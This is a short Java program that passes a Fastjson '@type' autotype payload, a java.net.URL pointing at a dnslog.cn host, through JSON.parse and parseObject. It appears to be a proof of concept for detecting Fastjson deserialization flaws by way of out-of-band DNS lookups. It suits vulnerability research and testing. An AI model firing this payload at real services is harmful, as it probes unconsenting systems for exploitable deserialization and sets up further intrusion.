package org.example;

import com.alibaba.fastjson.JSON;

public class URLDe {
    public static void main(String[] args) {
        String json = " {\"@type\":\"java.net.URL\",\"val\":\"http://2c8yyd.dnslog.cn/exp\"}";
        System.out.printf("Parse had done => %s\n", JSON.parse(json).getClass());
        System.out.printf("parseObject one has done => %s\n",JSON.parseObject(json).getClass());
        System.out.printf("parseObject second has done => %s\n",JSON.parseObject(json,java.net.URL.class).getClass());
    }
}
